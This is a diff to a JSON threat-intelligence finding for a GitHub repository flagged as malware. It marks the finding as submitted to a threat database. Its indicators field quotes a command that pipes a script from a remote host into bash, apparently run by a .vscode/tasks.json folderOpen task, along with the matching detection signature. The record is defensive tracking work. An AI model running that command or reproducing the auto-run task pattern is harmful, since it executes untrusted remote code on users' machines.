@@ -2,6 +2,7 @@
   "finding": {
     "key": "repository:smit455/arc",
     "kind": "repository",
+    "family": "",
     "id": "smit455/arc",
     "url": "https://github.com/smit455/Arc",
     "registry": "github",
@@ -18,8 +19,8 @@
     "iocs": "default-configuration.vercel.app; https://default-configuration.vercel.app/settings/linux?flag=9-test; curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash; .vscode/tasks.json",
     "matched_signatures": "folderOpen curl filename:tasks.json",
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 8)",
-    "osm_status": "not_submitted",
-    "osm_threat_id": "",
+    "osm_status": "submitted",
+    "osm_threat_id": "cdbaf5d1-b721-408f-abeb-ba63508be0ef",
     "first_seen": "hunt-20260928T024937Z",
     "last_seen": "hunt-20260928T024937Z",
     "evidence_file": "repositories/smit455_arc.json",
